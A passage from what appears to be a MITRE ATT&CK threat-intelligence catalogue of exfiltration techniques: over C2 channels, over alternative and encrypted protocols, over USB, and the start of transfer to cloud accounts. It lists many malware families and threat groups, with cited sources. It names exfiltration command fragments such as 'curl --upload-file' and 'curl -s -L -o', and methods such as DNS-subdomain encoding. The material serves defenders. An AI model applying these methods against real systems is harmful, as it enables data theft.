- [S0603] Stuxnet: [Stuxnet](https://attack.mitre.org/software/S0603) sends compromised victim information via HTTP.(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)
- [S0376] HOPLIGHT: [HOPLIGHT](https://attack.mitre.org/software/S0376) has used its C2 channel to exfiltrate data.(Citation: US-CERT HOPLIGHT Apr 2019)
- [S0439] Okrum: Data exfiltration is done by [Okrum](https://attack.mitre.org/software/S0439) using the already opened channel with the C2 server.(Citation: ESET Okrum July 2019)
- [S0373] Astaroth: [Astaroth](https://attack.mitre.org/software/S0373) exfiltrates collected information from its r1.log file to the external C2 server. (Citation: Cybereason Astaroth Feb 2019)
- [S0115] Crimson: [Crimson](https://attack.mitre.org/software/S0115) can exfiltrate stolen information over its C2.(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022)
- [S0391] HAWKBALL: [HAWKBALL](https://attack.mitre.org/software/S0391) has sent system information and files over the C2 channel.(Citation: FireEye HAWKBALL Jun 2019)
- [S1089] SharpDisco: [SharpDisco](https://attack.mitre.org/software/S1089) can load a plugin to exfiltrate stolen files to SMB shares also used in C2.(Citation: MoustachedBouncer ESET August 2023)
- [S0447] Lokibot: [Lokibot](https://attack.mitre.org/software/S0447) has the ability to initiate contact with command and control (C2) to exfiltrate stolen data.(Citation: FSecure Lokibot November 2019)
- [S0240] ROKRAT: [ROKRAT](https://attack.mitre.org/software/S0240) can send collected files back over same C2 channel.(Citation: Talos ROKRAT)
- [S0651] BoxCaon: [BoxCaon](https://attack.mitre.org/software/S0651) uploads files and data from a compromised host over the existing C2 channel.(Citation: Checkpoint IndigoZebra July 2021)
- [S0595] ThiefQuest: [ThiefQuest](https://attack.mitre.org/software/S0595) exfiltrates targeted file extensions in the <code>/Users/</code> folder to the command and control server via unencrypted HTTP. Network packets contain a string with two pieces of information: a file path and the contents of the file in a base64 encoded string.(Citation: wardle evilquest partii)(Citation: reed thiefquest ransomware analysis)
- [S0438] Attor: [Attor](https://attack.mitre.org/software/S0438) has exfiltrated data over the C2 channel.(Citation: ESET Attor Oct 2019)
- [S0687] Cyclops Blink: [Cyclops Blink](https://attack.mitre.org/software/S0687) has the ability to upload exfiltrated files to a C2 server.(Citation: NCSC Cyclops Blink February 2022)
- [S0568] EVILNUM: [EVILNUM](https://attack.mitre.org/software/S0568) can upload files over the C2 channel from the infected host.(Citation: Prevailion EvilNum May 2020)
- [S0520] BLINDINGCAN: [BLINDINGCAN](https://attack.mitre.org/software/S0520) has sent user and system information to a C2 server via HTTP POST requests.(Citation: NHS UK BLINDINGCAN Aug 2020)(Citation: US-CERT BLINDINGCAN Aug 2020)
- [S1160] Latrodectus: [Latrodectus](https://attack.mitre.org/software/S1160) can exfiltrate encrypted system information to the C2 server.(Citation: Latrodectus APR 2024)(Citation: Bitsight Latrodectus June 2024)
- [S0663] SysUpdate: [SysUpdate](https://attack.mitre.org/software/S0663) has exfiltrated data over its C2 channel.(Citation: Lunghi Iron Tiger Linux)
- [S0652] MarkiRAT: [MarkiRAT](https://attack.mitre.org/software/S0652) can exfiltrate locally stored data via its C2.(Citation: Kaspersky Ferocious Kitten Jun 2021)
- [S1178] ShrinkLocker: [ShrinkLocker](https://attack.mitre.org/software/S1178) will exfiltrate victim system information along with the encryption key via an HTTP POST.(Citation: Kaspersky ShrinkLocker 2024)(Citation: Splunk ShrinkLocker 2024)
- [S1016] MacMa: [MacMa](https://attack.mitre.org/software/S1016) exfiltrates data from a supplied path over its C2 channel.(Citation: ESET DazzleSpy Jan 2022)
- [S0476] Valak: [Valak](https://attack.mitre.org/software/S0476) has the ability to exfiltrate data over the C2 channel.(Citation: Cybereason Valak May 2020)(Citation: Unit 42 Valak July 2020)(Citation: SentinelOne Valak June 2020)
- [S0441] PowerShower: [PowerShower](https://attack.mitre.org/software/S0441) has used a PowerShell document stealer module to pack and exfiltrate .txt, .pdf, .xls or .doc files smaller than 5MB that were modified during the past two days.(Citation: Kaspersky Cloud Atlas August 2019)
- [S1034] StrifeWater: [StrifeWater](https://attack.mitre.org/software/S1034) can send data and files from a compromised host to its C2 server.(Citation: Cybereason StrifeWater Feb 2022)
- [S1166] Solar: [Solar](https://attack.mitre.org/software/S1166) can send staged files to C2 for exfiltration.(Citation: ESET OilRig Campaigns Sep 2023)
- [S1060] Mafalda: [Mafalda](https://attack.mitre.org/software/S1060) can send network system data and files to its C2 server.(Citation: SentinelLabs Metador Sept 2022)
- [G0094] Kimsuky: [Kimsuky](https://attack.mitre.org/groups/G0094) has exfiltrated data over its C2 channel.(Citation: Securelist Kimsuky Sept 2013)(Citation: Talos Kimsuky Nov 2021)
- [S1169] Mango: [Mango](https://attack.mitre.org/software/S1169) can use its HTTP C2 channel for exfiltration.(Citation: ESET OilRig Campaigns Sep 2023)
- [S0031] BACKSPACE: Adversaries can direct [BACKSPACE](https://attack.mitre.org/software/S0031) to upload files to the C2 Server.(Citation: FireEye APT30)
- [S1213] Lumma Stealer: [Lumma Stealer](https://attack.mitre.org/software/S1213) has exfiltrated collected data over existing HTTP and HTTPS C2 channels.(Citation: Qualys LummaStealer 2024)(Citation: Fortinet LummaStealer 2024)
- [S0667] Chrommme: [Chrommme](https://attack.mitre.org/software/S0667) can exfiltrate collected data via C2.(Citation: ESET Gelsemium June 2021)
- [S0604] Industroyer: [Industroyer](https://attack.mitre.org/software/S0604) sends information about hardware profiles and previously-received commands back to the C2 server in a POST-request.(Citation: ESET Industroyer)
- [S0615] SombRAT: [SombRAT](https://attack.mitre.org/software/S0615) has uploaded collected data and files from a compromised host to its C2 server.(Citation: BlackBerry CostaRicto November 2020)
- [S0381] FlawedAmmyy: [FlawedAmmyy](https://attack.mitre.org/software/S0381) has sent data collected from a compromised host to its C2 servers.(Citation: Korean FSI TA505 2020)
- [G0128] ZIRCONIUM: [ZIRCONIUM](https://attack.mitre.org/groups/G0128) has exfiltrated files via the Dropbox API C2.(Citation: Zscaler APT31 Covid-19 October 2020)
- [S1182] MagicRAT: [MagicRAT](https://attack.mitre.org/software/S1182) exfiltrates data via HTTP over existing command and control channels.(Citation: Cisco MagicRAT 2022)
- [S0649] SMOKEDHAM: [SMOKEDHAM](https://attack.mitre.org/software/S0649) has exfiltrated data to its C2 server.(Citation: FireEye SMOKEDHAM June 2021)
- [S0696] Flagpro: [Flagpro](https://attack.mitre.org/software/S0696) has exfiltrated data to the C2 server.(Citation: NTT Security Flagpro new December 2021)
- [S0622] AppleSeed: [AppleSeed](https://attack.mitre.org/software/S0622) can exfiltrate files via the C2 channel.(Citation: Malwarebytes Kimsuky June 2021)
- [S0692] SILENTTRINITY: [SILENTTRINITY](https://attack.mitre.org/software/S0692) can transfer files from an infected host to the C2 server.(Citation: GitHub SILENTTRINITY Modules July 2019)
- [S0502] Drovorub: [Drovorub](https://attack.mitre.org/software/S0502) can exfiltrate files over C2 infrastructure.(Citation: NSA/FBI Drovorub August 2020)
- [S0572] Caterpillar WebShell: [Caterpillar WebShell](https://attack.mitre.org/software/S0572) can upload files over the C2 channel.(Citation: ClearSky Lebanese Cedar Jan 2021)
- [G1043] BlackByte: [BlackByte](https://attack.mitre.org/groups/G1043) transmitted collected victim host information via HTTP POST to command and control infrastructure.(Citation: Microsoft BlackByte 2023)
- [S1170] ODAgent: [ODAgent](https://attack.mitre.org/software/S1170) can use an attacker-controlled OneDrive account to receive C2 commands and to exfiltrate files.(Citation: ESET OilRig Downloaders DEC 2023)
- [S1075] KOPILUWAK: [KOPILUWAK](https://attack.mitre.org/software/S1075) has exfiltrated collected data to its C2 via POST requests.(Citation: Mandiant Suspected Turla Campaign February 2023)
- [C0014] Operation Wocao: During [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors used the XServer backdoor to exfiltrate data.(Citation: FoxIT Wocao December 2019)
- [S1148] Raccoon Stealer: [Raccoon Stealer](https://attack.mitre.org/software/S1148) uses existing HTTP-based command and control channels for exfiltration.(Citation: S2W Racoon 2022)(Citation: Sekoia Raccoon1 2022)(Citation: Sekoia Raccoon2 2022)
- [S0434] Imminent Monitor: [Imminent Monitor](https://attack.mitre.org/software/S0434) has uploaded a file containing debugger logs, network information and system information to the C2.(Citation: QiAnXin APT-C-36 Feb2019)
- [S0078] Psylo: [Psylo](https://attack.mitre.org/software/S0078) exfiltrates data to its C2 server over the same protocol as C2 communications.(Citation: Scarlet Mimic Jan 2016)
- [S0147] Pteranodon: [Pteranodon](https://attack.mitre.org/software/S0147) exfiltrates screenshot files to its C2 server.(Citation: Palo Alto Gamaredon Feb 2017)
- [S0487] Kessel: [Kessel](https://attack.mitre.org/software/S0487) has exfiltrated information gathered from the infected system to the C2 server.(Citation: ESET ForSSHe December 2018)
- [S1059] metaMain: [metaMain](https://attack.mitre.org/software/S1059) can upload collected files and data to its C2 server.(Citation: SentinelLabs Metador Technical Appendix Sept 2022)
- [S0610] SideTwist: [SideTwist](https://attack.mitre.org/software/S0610) has exfiltrated data over its C2 channel.(Citation: Check Point APT34 April 2021)
- [S0461] SDBbot: [SDBbot](https://attack.mitre.org/software/S0461) has sent collected data from a compromised host to its C2 servers.(Citation: Korean FSI TA505 2020)
- [G0142] Confucius: [Confucius](https://attack.mitre.org/groups/G0142) has exfiltrated stolen files to its C2 server.(Citation: TrendMicro Confucius APT Aug 2021)
- [S0268] Bisonal: [Bisonal](https://attack.mitre.org/software/S0268) has added the exfiltrated data to the URL over the C2 channel.(Citation: Talos Bisonal Mar 2020)
- [S0448] Rising Sun: [Rising Sun](https://attack.mitre.org/software/S0448) can send data gathered from the infected machine via HTTP POST request to the C2.(Citation: McAfee Sharpshooter December 2018)
- [G1035] Winter Vivern: [Winter Vivern](https://attack.mitre.org/groups/G1035) delivered a PowerShell script capable of recursively scanning victim machines looking for various file types before exfiltrating identified files via HTTP.(Citation: CERT-UA WinterVivern 2023)
- [S1196] Troll Stealer: [Troll Stealer](https://attack.mitre.org/software/S1196) exfiltrates collected information to its command and control infrastructure.(Citation: S2W Troll Stealer 2024)
- [S1132] IPsec Helper: [IPsec Helper](https://attack.mitre.org/software/S1132) exfiltrates specific files through its command and control framework.(Citation: SentinelOne Agrius 2021)
- [S0385] njRAT: [njRAT](https://attack.mitre.org/software/S0385) has used HTTP to receive stolen information from the infected machine.(Citation: Trend Micro njRAT 2018)
- [S0526] KGH_SPY: [KGH_SPY](https://attack.mitre.org/software/S0526) can exfiltrate collected information from the host to the C2 server.(Citation: Cybereason Kimsuky November 2020)
- [S1159] DUSTTRAP: [DUSTTRAP](https://attack.mitre.org/software/S1159) can exfiltrate collected data over C2 channels.(Citation: Google Cloud APT41 2024)
- [S1026] Mongall: [Mongall](https://attack.mitre.org/software/S1026) can upload files and information from a compromised host to its C2 server.(Citation: SentinelOne Aoqin Dragon June 2022)
- [S1122] Mispadu: [Mispadu](https://attack.mitre.org/software/S1122) can sends the collected financial data to the C2 server.(Citation: ESET Security Mispadu Facebook Ads 2019)(Citation: SCILabs Malteiro 2021)
- [G0102] Wizard Spider: [Wizard Spider](https://attack.mitre.org/groups/G0102) has exfiltrated domain credentials and network enumeration information over command and control (C2) channels.(Citation: CrowdStrike Grim Spider May 2019)(Citation: Mandiant FIN12 Oct 2021)
- [S0238] Proxysvc: [Proxysvc](https://attack.mitre.org/software/S0238) performs data exfiltration over the control server channel using a custom protocol.(Citation: McAfee GhostSecret)
- [S0356] KONNI: [KONNI](https://attack.mitre.org/software/S0356) has sent data and files to its C2 server.(Citation: Talos Konni May 2017)(Citation: Malwarebytes Konni Aug 2021)(Citation: Malwarebytes KONNI Evolves Jan 2022)
- [S0633] Sliver: [Sliver](https://attack.mitre.org/software/S0633) can exfiltrate files from the victim using the <code>download</code> command.(Citation: GitHub Sliver Download)
- [S1050] PcShare: [PcShare](https://attack.mitre.org/software/S1050) can upload files and information from a compromised host to its C2 servers.(Citation: Bitdefender FunnyDream Campaign November 2020)
- [G1030] Agrius: [Agrius](https://attack.mitre.org/groups/G1030) exfiltrated staged data using tools such as Putty and WinSCP, communicating with command and control servers.(Citation: Unit42 Agrius 2023)
- [S0671] Tomiris: [Tomiris](https://attack.mitre.org/software/S0671) can upload files matching a hardcoded set of extensions, such as .doc, .docx, .pdf, and .rar, to its C2 server.(Citation: Kaspersky Tomiris Sep 2021)
- [S0587] Penquin: [Penquin](https://attack.mitre.org/software/S0587) can execute the command code <code>do_upload</code> to send files to C2.(Citation: Leonardo Turla Penquin May 2020)
- [S1024] CreepySnail: [CreepySnail](https://attack.mitre.org/software/S1024) can connect to C2 for data exfiltration.(Citation: Microsoft POLONIUM June 2022)
- [S0239] Bankshot: [Bankshot](https://attack.mitre.org/software/S0239) exfiltrates data over its C2 channel.(Citation: McAfee Bankshot)
- [C0001] Frankenstein: During [Frankenstein](https://attack.mitre.org/campaigns/C0001), the threat actors collected information via [Empire](https://attack.mitre.org/software/S0363), which sent the data back to the adversary's C2.(Citation: Talos Frankenstein June 2019)
- [G0065] Leviathan: [Leviathan](https://attack.mitre.org/groups/G0065) has exfiltrated data over its C2 channel.(Citation: CISA AA21-200A APT40 July 2021)
- [S0084] Mis-Type: [Mis-Type](https://attack.mitre.org/software/S0084) has transmitted collected files and data to its C2 server.(Citation: Cylance Dust Storm)
- [S0495] RDAT: [RDAT](https://attack.mitre.org/software/S0495) can exfiltrate data gathered from the infected system via the established Exchange Web Services API C2 channel.(Citation: Unit42 RDAT July 2020)
- [G0047] Gamaredon Group: A [Gamaredon Group](https://attack.mitre.org/groups/G0047) file stealer can transfer collected files to a hardcoded C2 server.(Citation: Palo Alto Gamaredon Feb 2017)
- [S0680] LitePower: [LitePower](https://attack.mitre.org/software/S0680) can send collected data, including screenshots, over its C2 channel.(Citation: Kaspersky WIRTE November 2021)
- [S0543] Spark: [Spark](https://attack.mitre.org/software/S0543) has exfiltrated data over the C2 channel.(Citation: Unit42 Molerat Mar 2020)
- [S0045] ADVSTORESHELL: [ADVSTORESHELL](https://attack.mitre.org/software/S0045) exfiltrates data over the same channel used for C2.(Citation: ESET Sednit Part 2)
- [S0477] Goopy: [Goopy](https://attack.mitre.org/software/S0477) has the ability to exfiltrate data over the Microsoft Outlook C2 channel.(Citation: Cybereason Cobalt Kitty 2017)
- [S0077] CallMe: [CallMe](https://attack.mitre.org/software/S0077) exfiltrates data to its C2 server over the same protocol as C2 communications.(Citation: Scarlet Mimic Jan 2016)
- [S0588] GoldMax: [GoldMax](https://attack.mitre.org/software/S0588) can exfiltrate files over the existing C2 channel.(Citation: MSTIC NOBELIUM Mar 2021)(Citation: FireEye SUNSHUTTLE Mar 2021)
- [G0069] MuddyWater: [MuddyWater](https://attack.mitre.org/groups/G0069) has used C2 infrastructure to receive exfiltrated data.(Citation: Reaqta MuddyWater November 2017)
- [G0038] Stealth Falcon: After data is collected by [Stealth Falcon](https://attack.mitre.org/groups/G0038) malware, it is exfiltrated over the existing C2 channel.(Citation: Citizen Lab Stealth Falcon May 2016)
- [S0377] Ebury: [Ebury](https://attack.mitre.org/software/S0377) exfiltrates a list of outbound and inbound SSH sessions using OpenSSH's `known_host` files and `wtmp` records. [Ebury](https://attack.mitre.org/software/S0377) can exfiltrate SSH credentials through custom DNS queries or use the command `Xcat` to send the process's ssh session's credentials to the C2 server.(Citation: ESET Windigo Mar 2014)(Citation: ESET Ebury May 2024)
- [S0086] ZLib: [ZLib](https://attack.mitre.org/software/S0086) has sent data and files from a compromised host to its C2 servers.(Citation: Cylance Dust Storm)
- [S0024] Dyre: [Dyre](https://attack.mitre.org/software/S0024) has the ability to send information staged on a compromised host externally to C2.(Citation: Malwarebytes Dyreza November 2015)
- [S1078] RotaJakiro: [RotaJakiro](https://attack.mitre.org/software/S1078) sends device and other collected data back to the C2 using the established C2 channels over TCP. (Citation: RotaJakiro 2021 netlab360 analysis)
- [G1012] CURIUM: [CURIUM](https://attack.mitre.org/groups/G1012) has used IMAP and SMTPS for exfiltration via tools such as [IMAPLoader](https://attack.mitre.org/software/S1152).(Citation: PWC Yellow Liderc 2023)
- [S0632] GrimAgent: [GrimAgent](https://attack.mitre.org/software/S0632) has sent data related to a compromise host over its C2 channel.(Citation: Group IB GrimAgent July 2021)
- [S1081] BADHATCH: [BADHATCH](https://attack.mitre.org/software/S1081) can exfiltrate data over the C2 channel.(Citation: Gigamon BADHATCH Jul 2019)(Citation: BitDefender BADHATCH Mar 2021)
- [S1031] PingPull: [PingPull](https://attack.mitre.org/software/S1031) has the ability to exfiltrate stolen victim data through its C2 channel.(Citation: Unit 42 PingPull Jun 2022)
- [S0538] Crutch: [Crutch](https://attack.mitre.org/software/S0538) can exfiltrate data over the primary C2 channel (Dropbox HTTP API).(Citation: ESET Crutch December 2020)
- [S0264] OopsIE: [OopsIE](https://attack.mitre.org/software/S0264) can upload files from the victim's machine to its C2 server.(Citation: Unit 42 OopsIE! Feb 2018)


### T1048 - Exfiltration Over Alternative Protocol

Description:

Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  

Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. 

[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.(Citation: 20 macOS Common Tools and Techniques)

Many IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or [Cloud API](https://attack.mitre.org/techniques/T1059/009).

Procedures:

- [S0482] Bundlore: [Bundlore](https://attack.mitre.org/software/S0482) uses the <code>curl -s -L -o</code> command to exfiltrate archived data to a URL.(Citation: 20 macOS Common Tools and Techniques)
- [S0428] PoetRAT: [PoetRAT](https://attack.mitre.org/software/S0428) has used a .NET tool named dog.exe to exiltrate information over an e-mail account.(Citation: Talos PoetRAT April 2020)
- [G1040] Play: [Play](https://attack.mitre.org/groups/G1040) has used WinSCP to exfiltrate data to actor-controlled accounts.(Citation: CISA Play Ransomware Advisory December 2023)(Citation: Trend Micro Ransomware Spotlight Play July 2023)
- [G0139] TeamTNT: [TeamTNT](https://attack.mitre.org/groups/G0139) has sent locally staged files with collected credentials to C2 servers using cURL.(Citation: Cisco Talos Intelligence Group)
- [S0631] Chaes: [Chaes](https://attack.mitre.org/software/S0631) has exfiltrated its collected data from the infected machine to the C2, sometimes using the MIME protocol.(Citation: Cybereason Chaes Nov 2020)
- [S0503] FrameworkPOS: [FrameworkPOS](https://attack.mitre.org/software/S0503) can use DNS tunneling for exfiltration of credit card data.(Citation: SentinelOne FrameworkPOS September 2019)
- [S0641] Kobalos: [Kobalos](https://attack.mitre.org/software/S0641) can exfiltrate credentials over the network via UDP.(Citation: ESET Kobalos Jan 2021)
- [S0203] Hydraq: [Hydraq](https://attack.mitre.org/software/S0203) connects to a predefined domain on port 443 to exfil gathered information.(Citation: Symantec Hydraq Jan 2010)
- [S0677] AADInternals: [AADInternals](https://attack.mitre.org/software/S0677) can directly download cloud user data such as OneDrive files.(Citation: AADInternals Documentation)

#### T1048.001 - Exfiltration Over Symmetric Encrypted Non-C2 Protocol

Description:

Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. 

Symmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. 

Network protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP).

#### T1048.002 - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol

Description:

Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. 

Asymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. 

Network protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.

Procedures:

- [G0007] APT28: [APT28](https://attack.mitre.org/groups/G0007) has exfiltrated archives of collected data previously staged on a target's OWA server via HTTPS.(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021)
- [S0483] IcedID: [IcedID](https://attack.mitre.org/software/S0483) has exfiltrated collected data via HTTPS.(Citation: DFIR_Sodinokibi_Ransomware)
- [G1012] CURIUM: [CURIUM](https://attack.mitre.org/groups/G1012) has used SMTPS to exfiltrate collected data from victims.(Citation: PWC Yellow Liderc 2023)
- [S1040] Rclone: [Rclone](https://attack.mitre.org/software/S1040) can exfiltrate data over SFTP or HTTPS via WebDAV.(Citation: Rclone)
- [G1046] Storm-1811: [Storm-1811](https://attack.mitre.org/groups/G1046) has exfiltrated captured user credentials via Secure Copy Protocol (SCP).(Citation: rapid7-email-bombing)
- [C0024] SolarWinds Compromise: During the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024), [APT29](https://attack.mitre.org/groups/G0016) exfiltrated collected data over a simple HTTPS request to a password-protected archive staged on a victim's OWA servers.(Citation: Volexity SolarWinds)

#### T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol

Description:

Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.(Citation: copy_cmd_cisco)

Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.

Procedures:

- [G0032] Lazarus Group: [Lazarus Group](https://attack.mitre.org/groups/G0032) malware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster RATs)
- [G0061] FIN8: [FIN8](https://attack.mitre.org/groups/G0061) has used FTP to exfiltrate collected data.(Citation: FireEye Know Your Enemy FIN8 Aug 2016)
- [S0125] Remsec: [Remsec](https://attack.mitre.org/software/S0125) can exfiltrate data via a DNS tunnel or email, separately from its C2 channel.(Citation: Kaspersky ProjectSauron Full Report)
- [S0492] CookieMiner: [CookieMiner](https://attack.mitre.org/software/S0492) has used the <code>curl --upload-file</code> command to exfiltrate data over HTTP.(Citation: Unit42 CookieMiner Jan 2019)
- [S1043] ccf32: [ccf32](https://attack.mitre.org/software/S1043) can upload collected data and files to an FTP server.(Citation: Bitdefender FunnyDream Campaign November 2020)
- [S1116] WARPWIRE: [WARPWIRE](https://attack.mitre.org/software/S1116) can send captured credentials to C2 via HTTP `GET` or `POST` requests.(Citation: Mandiant Cutting Edge January 2024)(Citation: Mandiant Cutting Edge Part 2 January 2024)
- [S0356] KONNI: [KONNI](https://attack.mitre.org/software/S0356) has used FTP to exfiltrate reconnaissance data out.(Citation: Medium KONNI Jan 2020)
- [S0252] Brave Prince: Some [Brave Prince](https://attack.mitre.org/software/S0252) variants have used South  Korea's Daum email service to exfiltrate information, and later variants have posted the data to a web server via an HTTP post command.(Citation: McAfee Gold Dragon)
- [S0674] CharmPower: [CharmPower](https://attack.mitre.org/software/S0674) can send victim data via FTP with credentials hardcoded in the script.(Citation: Check Point APT35 CharmPower January 2022)
- [S0050] CosmicDuke: [CosmicDuke](https://attack.mitre.org/software/S0050) exfiltrates collected files over FTP or WebDAV. Exfiltration servers can be separately configured from C2 servers.(Citation: F-Secure Cosmicduke)
- [G0076] Thrip: [Thrip](https://attack.mitre.org/groups/G0076) has used WinSCP to exfiltrate data from a targeted organization over FTP.(Citation: Symantec Thrip June 2018)
- [G0050] APT32: [APT32](https://attack.mitre.org/groups/G0050)'s backdoor can exfiltrate data by encoding it in the subdomain field of DNS packets.(Citation: ESET OceanLotus Mar 2019)
- [S0212] CORALDECK: [CORALDECK](https://attack.mitre.org/software/S0212) has exfiltrated data in HTTP POST headers.(Citation: FireEye APT37 Feb 2018)
- [G1045] Salt Typhoon: [Salt Typhoon](https://attack.mitre.org/groups/G1045) has exfiltrated configuration files from exploited network devices over FTP and TFTP.(Citation: Cisco Salt Typhoon FEB 2025)
- [G0102] Wizard Spider: [Wizard Spider](https://attack.mitre.org/groups/G0102) has exfiltrated victim information using FTP.(Citation: DFIR Ryuk's Return October 2020)(Citation: DFIR Ryuk 2 Hour Speed Run November 2020)
- [S0331] Agent Tesla: [Agent Tesla](https://attack.mitre.org/software/S0331) has routines for exfiltration over SMTP, FTP, and HTTP.(Citation: Talos Agent Tesla Oct 2018)(Citation: Bitdefender Agent Tesla April 2020)(Citation: SentinelLabs Agent Tesla Aug 2020)
- [S0428] PoetRAT: [PoetRAT](https://attack.mitre.org/software/S0428) has used [ftp](https://attack.mitre.org/software/S0095) for exfiltration.(Citation: Talos PoetRAT April 2020)
- [C0017] C0017: During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) exfiltrated victim data via DNS lookups by encoding and prepending it as subdomains to the attacker-controlled domain.(Citation: Mandiant APT41)
- [G0049] OilRig: [OilRig](https://attack.mitre.org/groups/G0049) has exfiltrated data via Microsoft Exchange and over FTP separately from its primary C2 channel over DNS.(Citation: Palo Alto OilRig Oct 2016)(Citation: Trend Micro Earth Simnavaz October 2024)
- [S0335] Carbon: [Carbon](https://attack.mitre.org/software/S0335) uses HTTP to send data to the C2 server.(Citation: ESET Carbon Mar 2017)
- [S0190] BITSAdmin: [BITSAdmin](https://attack.mitre.org/software/S0190) can be used to create [BITS Jobs](https://attack.mitre.org/techniques/T1197) to upload files from a compromised host.(Citation: Microsoft BITSAdmin)
- [S0281] Dok: [Dok](https://attack.mitre.org/software/S0281) exfiltrates logs of its execution stored in the <code>/tmp</code> folder over FTP using the <code>curl</code> command.(Citation: hexed osx.dok analysis 2019)
- [G0064] APT33: [APT33](https://attack.mitre.org/groups/G0064) has used FTP to exfiltrate files (separately from the C2 channel).(Citation: Symantec Elfin Mar 2019)
- [S0095] ftp: [ftp](https://attack.mitre.org/software/S0095) may be used to exfiltrate data separate from the main command and control protocol.(Citation: Microsoft FTP)(Citation: Linux FTP)
- [G0037] FIN6: [FIN6](https://attack.mitre.org/groups/G0037) has sent stolen payment card data to remote servers via HTTP POSTs.(Citation: Trend Micro FIN6 October 2019)
- [S0487] Kessel: [Kessel](https://attack.mitre.org/software/S0487) can exfiltrate credentials and other information via HTTP POST request, TCP, and DNS.(Citation: ESET ForSSHe December 2018)
- [S0466] WindTail: [WindTail](https://attack.mitre.org/software/S0466) has the ability to automatically exfiltrate files using the macOS built-in utility /usr/bin/curl.(Citation: objective-see windtail2 jan 2019)
- [S1124] SocGholish: [SocGholish](https://attack.mitre.org/software/S1124) can exfiltrate data directly to its C2 domain via HTTP.(Citation: Red Canary SocGholish March 2024)
- [S0107] Cherry Picker: [Cherry Picker](https://attack.mitre.org/software/S0107) exfiltrates files over FTP.(Citation: Trustwave Cherry Picker)
- [S1040] Rclone: [Rclone](https://attack.mitre.org/software/S1040) can exfiltrate data over FTP or HTTP, including HTTP via WebDAV.(Citation: Rclone)


### T1052 - Exfiltration Over Physical Medium

Description:

Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.

#### T1052.001 - Exfiltration over USB

Description:

Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.

Procedures:

- [S0035] SPACESHIP: [SPACESHIP](https://attack.mitre.org/software/S0035) copies staged data to removable drives when they are inserted into the system.(Citation: FireEye APT30)
- [S0125] Remsec: [Remsec](https://attack.mitre.org/software/S0125) contains a module to move data from airgapped networks to Internet-connected systems by using a removable USB device.(Citation: Kaspersky ProjectSauron Full Report)
- [S0136] USBStealer: [USBStealer](https://attack.mitre.org/software/S0136) exfiltrates collected files via removable media from air-gapped victims.(Citation: ESET Sednit USBStealer 2014)
- [G0081] Tropic Trooper: [Tropic Trooper](https://attack.mitre.org/groups/G0081) has exfiltrated data using USB storage devices.(Citation: TrendMicro Tropic Trooper May 2020)
- [G0129] Mustang Panda: [Mustang Panda](https://attack.mitre.org/groups/G0129) has used a customized [PlugX](https://attack.mitre.org/software/S0013) variant which could exfiltrate documents from air-gapped networks.(Citation: Avira Mustang Panda January 2020)
- [S0092] Agent.btz: [Agent.btz](https://attack.mitre.org/software/S0092) creates a file named thumb.dd on all USB flash drives connected to the victim. This file contains information about the infected system and activity logs.(Citation: Securelist Agent.btz)
- [S0409] Machete: [Machete](https://attack.mitre.org/software/S0409) has a feature to copy files from every drive onto a removable drive in a hidden folder.(Citation: ESET Machete July 2019)(Citation: Securelist Machete Aug 2014)


### T1537 - Transfer Data to Cloud Account

Description:

Adversaries may exfiltrate data by transferring the data, including through sharing/syncing and creating backups of cloud environments, to another cloud account they control on the same service.

